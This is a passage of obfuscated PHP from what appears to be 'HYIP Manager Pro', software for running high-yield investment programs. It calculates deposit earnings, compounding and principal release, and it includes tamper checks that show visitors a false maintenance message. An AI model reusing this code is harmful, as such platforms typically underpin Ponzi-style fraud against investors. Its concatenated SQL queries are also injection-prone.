        $elnlcHWuCT = $elnlcMuwB[$elnlcebOCn['elnlcJnlR']] + $elnlcMuwB[$elnlcebOCn['elnlcSESNT']] - (0 < $elnlcMuwB[delay] ? 1 : 0);
        $elnlcuIrtW = $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
        if ($elnlcMuwB[$elnlcebOCn['elnlcECdHB']] == 1)
        {
          $q = '' . 'select * from hm2_deposits where 
                type_id = ' . $elnlcuIrtW . ' and 
                status = \'on\' and 
                user_id = ' . $elnlczfrLe . ' and 
                (deposit_date + interval ' . $elnlcHWuCT . ' ' . ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcnepOu'] ? 'hour' : 'day') . ('' . ' < last_pay_date or deposit_date + interval ' . $elnlcHWuCT . ' ') . ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcnepOu'] ? 'hour' : 'day') . ('' . ' < now()) and
                ((' . $elnlcMuwB[$elnlcebOCn['elnlcJGsj']] . ' = 0) || (' . $elnlcMuwB[$elnlcebOCn['elnlcJGsj']] . ' && (deposit_date + interval ' . $elnlcMuwB[$elnlcebOCn['elnlcqTPw']] . ' ') . ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcnepOu'] ? 'hour' : 'day') . ' < now())))
             ';
          $elnlcdQvlB = mysql_query ($q);
          while ($elnlckicWw = mysql_fetch_array ($elnlcdQvlB))
          {
            $elnlcLlSxk = $elnlckicWw[$elnlcebOCn['elnlcdIzRV']];
            $elnlcqQJS = 'Deposit return';
            if ($elnlcMuwB[$elnlcebOCn['elnlcRRrP']] != 0)
            {
              $elnlcLlSxk = floor ($elnlckicWw[$elnlcebOCn['elnlcdIzRV']] * (100 - $elnlcMuwB[$elnlcebOCn['elnlcRRrP']])) / 100;
              $elnlcqQJS = '' . 'Deposit return. ' . $elnlcMuwB[$elnlcebOCn['elnlcRRrP']] . '% holded.';
            }

            $q = 'insert into hm2_history set
                user_id = ' . $elnlckicWw[$elnlcebOCn['elnlcREbrh']] . ',
      		amount = ' . $elnlcLlSxk . ',
      		type=\'release_deposit\',
      		actual_amount = ' . $elnlcLlSxk . ',
                ec = ' . $elnlckicWw[$elnlcebOCn['elnlcuNubW']] . ',
      		date = \'' . $elnlckicWw[$elnlcebOCn['elnlclltKC']] . ('' . '\' + interval ' . $elnlcHWuCT . ' ') . ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcnepOu'] ? 'hour' : 'day') . ',
                deposit_id = ' . $elnlckicWw[$elnlcebOCn['elnlcdfxo']] . ('' . ',
                description = \'' . $elnlcqQJS . '\'');
            (mysql_query ($q) OR print mysql_error ());
          }
        }

        $q = '' . 'update hm2_deposits set status=\'off\' where 
             user_id = ' . $elnlczfrLe . ' and 
    	       (deposit_date + interval ' . $elnlcHWuCT . ' ' . ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcnepOu'] ? 'hour' : 'day') . ('' . ' < last_pay_date or deposit_date + interval ' . $elnlcHWuCT . ' ') . ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcnepOu'] ? 'hour' : 'day') . ('' . ' < now()) and
             ((' . $elnlcMuwB[$elnlcebOCn['elnlcJGsj']] . ' = 0) || (' . $elnlcMuwB[$elnlcebOCn['elnlcJGsj']] . ' && (deposit_date + interval ' . $elnlcMuwB[$elnlcebOCn['elnlcqTPw']] . ' ') . ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcnepOu'] ? 'hour' : 'day') . ('' . ' < now()))) and
             type_id = ' . $elnlcuIrtW . '
           ');
        (mysql_query ($q) OR print mysql_error ());
      }

      flock ($elnlcdNpUt, LOCK_UN);
      fclose ($elnlcdNpUt);
      unlink ('' . './tmpl_c/lock_user' . $elnlczfrLe);
    }

  }

  function elnlckmoiv ($elnlcfbyH)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    $elnlcdqPPA = array ();
    if (($elnlcroEyb[$elnlcebOCn['elnlcueEm']] == 1 AND $elnlcfbyH != -2))
    {
      return null;
    }

    $q = 'select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = \'on\' and hm2_types.id = hm2_plans.parent order by parent, min_deposit';
    ($elnlcaJzM = mysql_query ($q) OR print mysql_error ());
    while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
    {
      $elnlcdqPPA[$elnlcMuwB[$elnlcebOCn['elnlcomxrc']]][$elnlcMuwB[$elnlcebOCn['elnlcdfxo']]] = $elnlcMuwB;
    }

    $elnlcRHhI = $elnlcebOCn['elnlciREG'];
    $elnlciBVQW = 'u.last_access_time + interval 30 minute < now() ';
    if ($elnlcfbyH == -1)
    {
      $elnlciBVQW = '1 = 1';
      $q = 'select * from hm2_users where l_e_t + interval 15 minute < now() and status = \'on\'';
    }
    else
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcfbyH . ' and status = \'on\'';
    }

    if ($elnlcfbyH == -2)
    {
      $q = 'select * from hm2_users where status = \'on\'';
      $q = 'select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id';
    }

    ($elnlcLvIi = mysql_query ($q) OR print mysql_error ());
    while ($elnlcnHamw = mysql_fetch_array ($elnlcLvIi))
    {
      $elnlczfrLe = $elnlcnHamw[$elnlcebOCn['elnlcdfxo']];
      $q = '' . 'update hm2_users set l_e_t = now() where id = ' . $elnlczfrLe;
      (mysql_query ($q) OR print mysql_error ());
      $elnlcRHhI = $elnlcebOCn['elnlciREG'];
      while (0 < $elnlcRHhI)
      {
        $q = '' . 'select 
              d.*, 
              t.period as period, t.use_compound as use_compound,
              t.compound_min_deposit, t.compound_max_deposit,
              t.compound_min_percent, t.compound_max_percent,
              t.compound_percents_type, t.compound_percents,
              t.work_week as work_week,
              t.q_days as q_days, t.withdraw_principal,
              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,
              t.return_profit as return_profit
            from
              hm2_deposits as d,
              hm2_types as t,
              hm2_users as u
            where 
              u.id = ' . $elnlczfrLe . ' and 
              u.status = \'on\' and 
              d.status=\'on\' and 
              d.type_id = t.id and 
              t.status = \'on\' and 
              u.id = d.user_id and
              (((t.q_days + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / (60*60*24))) or t.q_days = 0) and 
              (
                (d.last_pay_date + interval 1 hour <= now() and t.period = \'h\')or
                (d.last_pay_date + interval 1 day <= now() and t.period = \'d\')or
                (d.last_pay_date + interval 7 day <= now() and t.period = \'w\') or
                (d.last_pay_date + interval 14 day <= now() and t.period = \'b-w\') or
                (d.last_pay_date + interval 1 month <= now() and t.period = \'m\') or
                (d.last_pay_date + interval 2 month <= now() and t.period = \'2m\') or
                (d.last_pay_date + interval 3 month <= now() and t.period = \'3m\') or
                (d.last_pay_date + interval 6 month <= now() and t.period = \'6m\') or
                (d.last_pay_date + interval 1 year <= now() and t.period = \'y\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day <= now() and t.period = \'end\') 
              ) and
              ((t.q_days = 0) or 
                (               
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date  and t.period = \'h\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date  and t.period = \'d\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = \'w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = \'b-w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = \'m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = \'2m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = \'3m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = \'6m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = \'y\') or
                (t.q_days > 0 and t.period = \'end\') 
              ))';
        ($elnlcaJzM = mysql_query ($q) OR print mysql_error ());
        $elnlcRHhI = $elnlcebOCn['elnlcMkRzz'];
        while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
        {
          ++$elnlcRHhI;
          if (!isset ($elnlcdqPPA[$elnlcMuwB[$elnlcebOCn['elnlcPPdPx']]]))
          {
            continue;
          }

          $elnlcGRpDe = $elnlcebOCn['elnlcMkRzz'];
          $elnlcdoNrO = $elnlcebOCn['elnlcMkRzz'];
          reset ($elnlcdqPPA);
          reset ($elnlcdqPPA[$elnlcMuwB[$elnlcebOCn['elnlcPPdPx']]]);
          while (list ($elnlceUGI, $elnlcSMRUm) = each ($elnlcdqPPA[$elnlcMuwB[$elnlcebOCn['elnlcPPdPx']]]))
          {
            if (($elnlcSMRUm[$elnlcebOCn['elnlcSTGg']] <= $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] AND ($elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] <= $elnlcSMRUm[$elnlcebOCn['elnlcStkL']] OR $elnlcSMRUm[$elnlcebOCn['elnlcStkL']] == 0)))
            {
              $elnlcGRpDe = $elnlcSMRUm[$elnlcebOCn['elnlclWRL']];
            }

            if (($elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] < $elnlcSMRUm[$elnlcebOCn['elnlcSTGg']] AND $elnlcGRpDe == 0))
            {
              $elnlcGRpDe = $elnlcdoNrO;
            }

            if (($elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] < $elnlcSMRUm[$elnlcebOCn['elnlcSTGg']] AND 0 < $elnlcGRpDe))
            {
              break;
            }

            $elnlcdoNrO = $elnlcSMRUm[$elnlcebOCn['elnlclWRL']];
          }

          if (($elnlcSMRUm[$elnlcebOCn['elnlcStkL']] != 0 AND $elnlcSMRUm[$elnlcebOCn['elnlcStkL']] < $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']]))
          {
            $elnlcGRpDe = $elnlcdoNrO;
          }

          $elnlctAAR = $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] * $elnlcGRpDe / 100;
          $elnlcJBjo = '';
          if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcdcUM'])
          {
            $elnlcJBjo = ' 1 day ';
          }
          else
          {
            if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcnepOu'])
            {
              $elnlcJBjo = ' 1 hour ';
            }
            else
            {
              if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcOjqv'])
              {
                $elnlcJBjo = ' 7 day ';
              }
              else
              {
                if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == 'b-w')
                {
                  $elnlcJBjo = ' 14 day ';
                }
                else
                {
                  if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcndCCA'])
                  {
                    $elnlcJBjo = ' 1 month ';
                  }
                  else
                  {
                    if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcUJuca'])
                    {
                      $elnlcJBjo = ' 2 month ';
                    }
                    else
                    {
                      if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcmKFT'])
                      {
                        $elnlcJBjo = ' 3 month ';
                      }
                      else
                      {
                        if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcwVAV'])
                        {
                          $elnlcJBjo = ' 6 month ';
                        }
                        else
                        {
                          if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlccnjUF'])
                          {
                            $elnlcJBjo = ' 1 year ';
                          }
                          else
                          {
                            if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcOWeSR'])
                            {
                              $elnlcJBjo = ' ' . $elnlcMuwB[$elnlcebOCn['elnlcJnlR']] . ' day ';
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }

          if (($elnlcGRpDe == 0 AND $elnlcJBjo == ''))
          {
            continue;
          }

          $elnlcbJRz = -1;
          $q = 'select weekday(\'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ') as dw');
          ($elnlcDTsPf = mysql_query ($q) OR print mysql_error ());
          while ($elnlcgKLwu = mysql_fetch_array ($elnlcDTsPf))
          {
            $elnlcbJRz = $elnlcgKLwu[$elnlcebOCn['elnlckWIE']];
          }

          $q = 'select count(id) as col from hm2_history where ' . ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcnepOu'] ? ' date_format(date, \'%Y-%m-%d  %H\') = date_format(\'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ', \'%Y-%m-%d  %H\') and') : 'to_days(date) = to_days(\'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ') and ')) . ' deposit_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
          ($elnlcLxDNR = mysql_query ($q) OR print mysql_error ());
          $elnlcNSMEL = $elnlcebOCn['elnlcMkRzz'];
          while ($elnlciJMKa = mysql_fetch_array ($elnlcLxDNR))
          {
            $elnlcNSMEL = $elnlciJMKa[$elnlcebOCn['elnlclbIq']];
          }

          if ($elnlcNSMEL == 0)
          {
            if ((5 <= $elnlcbJRz AND $elnlcMuwB[$elnlcebOCn['elnlcQulec']] == 1))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcREbrh']] . ',
                    amount = 0,
                    type = \'earning\',
                    description = \'No interest on ' . ($elnlcbJRz == 5 ? 'Saturday' : 'Sunday') . '\',
                    actual_amount = 0,
                    date = \'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ',
                    ec = ') . $elnlcMuwB[$elnlcebOCn['elnlcuNubW']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
            }
            else
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcREbrh']] . ('' . ',
                    amount = ' . $elnlctAAR . ',
                    type = \'earning\',
                    description = \'Earning from deposit ') . $elnlcroEyb[$elnlcebOCn['elnlcDOlB']] . number_format ($elnlcMuwB[$elnlcebOCn['elnlcdIzRV']], 2) . ('' . ' - ' . $elnlcGRpDe . ' %\',
                    actual_amount = ' . $elnlctAAR . ',
                    date = \'') . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ',
                    ec = ') . $elnlcMuwB[$elnlcebOCn['elnlcuNubW']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
            }
          }

          (mysql_query ($q) OR print mysql_error ());
          $elnlcONjR = '';
          if ($elnlcMuwB[$elnlcebOCn['elnlcWLwD']] == $elnlcebOCn['elnlcOWeSR'])
          {
            if (($elnlcMuwB[$elnlcebOCn['elnlcJGsj']] == 0 OR ($elnlcMuwB[$elnlcebOCn['elnlcJGsj']] AND $elnlcMuwB[$elnlcebOCn['elnlcksWM']])))
            {
              $elnlcONjR = ', status = \'off\'';
            }

            if (($elnlcMuwB[$elnlcebOCn['elnlcECdHB']] == 1 AND ($elnlcMuwB[$elnlcebOCn['elnlcJGsj']] == 0 OR ($elnlcMuwB[$elnlcebOCn['elnlcJGsj']] AND $elnlcMuwB[$elnlcebOCn['elnlcksWM']]))))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcREbrh']] . ',
                    amount = ' . $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] . ',
                    type=\'release_deposit\',
                    actual_amount = ' . $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] . ',
                    ec = ' . $elnlcMuwB[$elnlcebOCn['elnlcuNubW']] . ',
                    date = \'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ',
                    deposit_id = ') . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
              (mysql_query ($q) OR print mysql_error ());
            }
          }
          else
          {
            if ((5 <= $elnlcbJRz AND $elnlcMuwB[$elnlcebOCn['elnlcQulec']] == 1))
            {
            }
            else
            {
              if (((0 < $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] AND $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] <= 100) AND $elnlcMuwB[$elnlcebOCn['elnlcNPfGR']] == 1))
              {
                if ($elnlcMuwB[$elnlcebOCn['elnlcRtrt']] == 0)
                {
                  $elnlcMuwB[$elnlcebOCn['elnlcRtrt']] = $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] + 1;
                }

                if (($elnlcMuwB[$elnlcebOCn['elnlclvlF']] <= $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] AND $elnlcMuwB[$elnlcebOCn['elnlcdIzRV']] <= $elnlcMuwB[$elnlcebOCn['elnlcRtrt']]))
                {
                  if ($elnlcMuwB[$elnlcebOCn['elnlcmoxNv']] == 1)
                  {
                    $elnlcAmNI = preg_split ('/\\s*,\\s*/', $elnlcMuwB[$elnlcebOCn['elnlcnhPg']]);
                    if (!in_array ($elnlcMuwB[$elnlcebOCn['elnlcKAJw']], $elnlcAmNI))
                    {
                      $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] = $elnlcAmNI[0];
                    }
                  }
                  else
                  {
                    if ($elnlcMuwB[$elnlcebOCn['elnlcKAJw']] < $elnlcMuwB[$elnlcebOCn['elnlcUSya']])
                    {
                      $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] = $elnlcMuwB[$elnlcebOCn['elnlcUSya']];
                    }

                    if ($elnlcMuwB[$elnlcebOCn['elnlcmVtNR']] < $elnlcMuwB[$elnlcebOCn['elnlcKAJw']])
                    {
                      $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] = $elnlcMuwB[$elnlcebOCn['elnlcmVtNR']];
                    }
                  }
                }
                else
                {
                  $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] = $elnlcebOCn['elnlcMkRzz'];
                }

                if ((0 < $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] AND $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] <= 100))
                {
                  $elnlcajRvg = $elnlctAAR * $elnlcMuwB[$elnlcebOCn['elnlcKAJw']] / 100;
                  $elnlctAAR = floor ((floor ($elnlctAAR * 100000) / 100000 - floor ($elnlcajRvg * 100000) / 100000) * 100) / 100;
                  $q = 'insert into hm2_history set user_id = ' . $elnlcMuwB[$elnlcebOCn['elnlcREbrh']] . ('' . ',
                        amount = -' . $elnlcajRvg . ',
                    		type=\'deposit\',
                    		description = \'Compounding deposit\',
                    		actual_amount = -' . $elnlcajRvg . ',
                    		ec = ') . $elnlcMuwB[$elnlcebOCn['elnlcuNubW']] . ',
                    		date = \'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo . ',
                                deposit_id = ') . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
                  (mysql_query ($q) OR print mysql_error ());
                  $q = '' . 'update hm2_deposits set amount = amount + ' . $elnlcajRvg . ',
                    		actual_amount = actual_amount + ' . $elnlcajRvg . '
                    		where id = ' . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
                  (mysql_query ($q) OR print mysql_error ());
                }
              }

              elnlcqalmb ($elnlcMuwB[$elnlcebOCn['elnlcdfxo']], $elnlctAAR, 'date = \'' . $elnlcMuwB[$elnlcebOCn['elnlcxRqo']] . ('' . '\' + interval ' . $elnlcJBjo));
            }
          }

          $q = '' . 'update hm2_deposits set 
      	q_pays = q_pays + 1, 
      	last_pay_date = last_pay_date + interval ' . $elnlcJBjo . ' ' . $elnlcONjR . ' where id =' . $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      $q = 'select * from hm2_types where q_days > 0';
      $elnlcaJzM = mysql_query ($q);
      while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
      {
        $elnlcHWuCT = $elnlcMuwB[$elnlcebOCn['elnlcJnlR']] + $elnlcMuwB[$elnlcebOCn['elnlcSESNT']] - (0 < $elnlcMuwB[$elnlcebOCn['elnlcSESNT']] ? 1 : 0);
        $elnlcuIrtW = $elnlcMuwB[$elnlcebOCn['elnlcdfxo']];
        if ($elnlcMuwB[$elnlcebOCn['elnlcECdHB']] == 1)
        {
          $q = '' . 'select * from hm2_deposits where 
                type_id = ' . $elnlcuIrtW . ' and 
                status = \'on\' and 
                user_id = ' . $elnlczfrLe . ' and 
                (deposit_date + interval ' . $elnlcHWuCT . ' day < last_pay_date or deposit_date + interval ' . $elnlcHWuCT . ' day < now()) and
                ((' . $elnlcMuwB[$elnlcebOCn['elnlcJGsj']] . ' = 0) || (' . $elnlcMuwB[$elnlcebOCn['elnlcJGsj']] . ' && (deposit_date + interval ' . $elnlcMuwB[$elnlcebOCn['elnlcqTPw']] . ' day < now())))
             ';
          $elnlcdQvlB = mysql_query ($q);
          while ($elnlckicWw = mysql_fetch_array ($elnlcdQvlB))
          {
            $q = 'insert into hm2_history set
                user_id = ' . $elnlckicWw[$elnlcebOCn['elnlcREbrh']] . ',
      		amount = ' . $elnlckicWw[$elnlcebOCn['elnlcdIzRV']] . ',
      		type=\'release_deposit\',
      		actual_amount = ' . $elnlckicWw[$elnlcebOCn['elnlcdIzRV']] . ',
                      ec = ' . $elnlckicWw[$elnlcebOCn['elnlcuNubW']] . ',
      		date = \'' . $elnlckicWw[$elnlcebOCn['elnlclltKC']] . ('' . '\' + interval ' . $elnlcHWuCT . ' day,
                      deposit_id = ') . $elnlckicWw[$elnlcebOCn['elnlcdfxo']];
            (mysql_query ($q) OR print mysql_error ());
          }
        }

        $q = '' . 'update hm2_deposits set status=\'off\' where 
             user_id = ' . $elnlczfrLe . ' and 
    	       (deposit_date + interval ' . $elnlcHWuCT . ' day < last_pay_date or deposit_date + interval ' . $elnlcHWuCT . ' day < now()) and
             ((' . $elnlcMuwB[$elnlcebOCn['elnlcJGsj']] . ' = 0) || (' . $elnlcMuwB[$elnlcebOCn['elnlcJGsj']] . ' && (deposit_date + interval ' . $elnlcMuwB[$elnlcebOCn['elnlcqTPw']] . ' day < now()))) and
             type_id = ' . $elnlcuIrtW . '
           ';
        (mysql_query ($q) OR print mysql_error ());
      }
    }

  }

  function elnlcpukl ($a)
  {
    global $elnlcebOCn;
    if ($a != 'hyip manager pro 2005 jul 26')
    {
      exit ();
    }

    if (!file_exists ('settings.php'))
    {
      return array ();
    }

    $elnlccwIh = file ($elnlcebOCn['elnlcasMhu']);
    $t = chop ($elnlccwIh[1]);
    $elnlcOzwH = strlen ($t) / 2;
    for ($i = $elnlcebOCn['elnlcMkRzz']; $i < strlen ($t); $i += 2)
    {
      $d[$i / 2] = substr ($t, $i, 2);
      $d[$i / 2] = chr (hexdec ($d[$i / 2]) ^ 65);
    }

    $k = '';
    $elnlcQSVER = elnlcrtpf (0, $elnlcOzwH, $d);
    $j = $elnlcOzwH;
    while (10 < $j)
    {
      $elnlcQSVER = elnlcrtpf ($elnlcQSVER, $elnlcOzwH, $d);
      $k .= $d[$elnlcQSVER];
      $d[$elnlcQSVER] = -1;
      --$j;
    }

    $z = chr (1) . chr (1) . chr (1);
    list ($k, $z) = split ('' . $z, $k, 2);
    list ($elnlcSEdH, $elnlcwPIKw, $k) = split (':', $k, 3);
    if ($elnlcSEdH != md5 ($k))
    {
      print 'Settings are broken. Contact developers please';
      exit ();
    }

    if ($elnlcwPIKw = !md5 ($elnlcSEdH . $elnlcIDxg))
    {
      print 'Settings are broken. Contact developers please';
      exit ();
    }

    $z = unserialize ($k);
    $z[time_dif] = sprintf ('%d', $z[$elnlcebOCn['elnlcAPcx']]);
    $elnlckSiPf = array ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', $elnlcebOCn['elnlcWacrK']);
    $z[$elnlcebOCn['elnlckkjO']] = $elnlckSiPf[$z[$elnlcebOCn['elnlcnbjvJ']] - 1];
    if ($z[$elnlcebOCn['elnlcJedG']] == 1)
    {
      $z[$elnlcebOCn['elnlcfWCl']] = sprintf ('%d', (time () - mktime (0, 0, 0, $z[$elnlcebOCn['elnlcnbjvJ']], $z[$elnlcebOCn['elnlcmpAn']], $z[$elnlcebOCn['elnlcyrOp']])) / 86400);
    }

    $z[$elnlcebOCn['elnlcNjyOc']] = ($z[$elnlcebOCn['elnlcyLTh']] ? 1 : 0);
    $z[$elnlcebOCn['elnlcpKeDO']] = $z[$elnlcebOCn['elnlcJxev']];
    return $z;
  }

  function elnlcndzme ()
  {
    global $elnlcebOCn;
    $elnlcBsAd = $elnlcebOCn['elnlcMkRzz'];
    if (file_exists ('./tmpl_c/.htdata'))
    {
      $elnlcBsAd = $elnlcebOCn['elnlciREG'];
    }

    $s = array ();
    $elnlccwIh = fopen ($elnlcebOCn['elnlcyLbu'], $elnlcebOCn['elnlcbiQmF']);
    if ($elnlccwIh)
    {
      while ($elnlcFwcH = fgets ($elnlccwIh, 20000))
      {
        $elnlcFwcH = chop ($elnlcFwcH);
        if (($elnlcFwcH != '<?/*' AND $elnlcFwcH != '*/?>'))
        {
          $elnlcjABcn = $elnlcNPsA = '';
          list ($elnlcjABcn, $elnlcNPsA) = @split ('	', $elnlcFwcH, 2);
          if (((preg_match ('/^key|^cnf/', $elnlcjABcn) AND $elnlcBsAd == 1) OR $elnlcBsAd == 0))
          {
            $s[$elnlcjABcn] = $elnlcNPsA;
            continue;
          }

          continue;
        }
      }
    }

    fclose ($elnlccwIh);
    if ($elnlcBsAd == 1)
    {
      list ($elnlcFwcH, $elnlcdAEjG) = file ($elnlcebOCn['elnlckqIc']);
      $elnlccqvfa = $elnlcFwcH;
      $elnlcGiNC = $elnlcebOCn['elnlcMkRzz'];
      for ($i = $elnlcebOCn['elnlcMkRzz']; $i < strlen ($elnlccqvfa); $i += 5)
      {
        $elnlcGiNC += hexdec (substr ($elnlccqvfa, $i, 5));
      }

      if ($s[$elnlcebOCn['elnlcJAtmi']] != $elnlcGiNC * 15)
      {
        print '<!-- Settings are broken. Please e-mail to script developers as soon as possible -->';
        print 'System maintenance and hardware upgrades.';
        exit ();
      }

      $elnlcFwcH = elnlcsvap ($elnlcFwcH, $s[$elnlcebOCn['elnlcKgpfS']]);
      $elnlcLNsAw = split ('
', $elnlcFwcH);
      for ($i = $elnlcebOCn['elnlcMkRzz']; $i < sizeof ($elnlcLNsAw); ++$i)
      {
        list ($elnlcjABcn, $elnlcNPsA) = split ('	', $elnlcLNsAw[$i], 2);
        $s[$elnlcjABcn] = $elnlcNPsA;
      }
    }

    $elnlckSiPf = array ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', $elnlcebOCn['elnlcWacrK']);
    $s[$elnlcebOCn['elnlckkjO']] = $elnlckSiPf[$s[$elnlcebOCn['elnlcnbjvJ']] - 1];
    if ($s[$elnlcebOCn['elnlcJedG']] == 1)
    {
      $s[$elnlcebOCn['elnlcfWCl']] = sprintf ('%d', (time () - mktime (0, 0, 0, $s[$elnlcebOCn['elnlcnbjvJ']], $s[$elnlcebOCn['elnlcmpAn']], $s[$elnlcebOCn['elnlcyrOp']])) / 86400);
    }

    $s[$elnlcebOCn['elnlcAPcx']] = sprintf ('%d', $s[$elnlcebOCn['elnlcAPcx']]);
    $s[$elnlcebOCn['elnlcNjyOc']] = ($s[$elnlcebOCn['elnlcyLTh']] ? 1 : 0);
    $s[$elnlcebOCn['elnlcpKeDO']] = $s[$elnlcebOCn['elnlcJxev']];
    return $s;
  }

  function elnlcabbat ($a)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    if ($a != 'hyip manager pro 2005 jul 26')
    {
      exit ();
    }

    $elnlcIDxg = serialize ($elnlcroEyb);
    $elnlcSEdH = md5 ($elnlcIDxg);
    $elnlcwPIKw = md5 ($elnlcSEdH . $elnlcIDxg);
    $elnlcIDxg = $elnlcSEdH . ':' . $elnlcwPIKw . ':' . $elnlcIDxg;
    $elnlcIDxg .= chr (1) . chr (1) . chr (1);
    $elnlcOzwH = strlen ($elnlcIDxg) + 121;
    $elnlcQSVER = rand (1, 100000000000) % $elnlcOzwH;
    $elnlcQBMaJ = array ();
    $d = array ();
    for ($i = $elnlcebOCn['elnlcMkRzz']; $i < $elnlcOzwH; ++$i)
    {
      $d[$i] = -1;
      $elnlcQBMaJ[$i] = -1;
    }

    $elnlcQSVER = elnlciqru (0, $elnlcOzwH, $d);
    for ($i = $elnlcebOCn['elnlcMkRzz']; $i < strlen ($elnlcIDxg); ++$i)
    {
      $elnlcQSVER = elnlciqru ($elnlcQSVER, $elnlcOzwH, $d);
      $d[$elnlcQSVER] = substr ($elnlcIDxg, $i, 1);
    }

    for ($i = $elnlcebOCn['elnlcMkRzz']; $i < $elnlcOzwH; ++$i)
    {
      if ($d[$i] == -1)
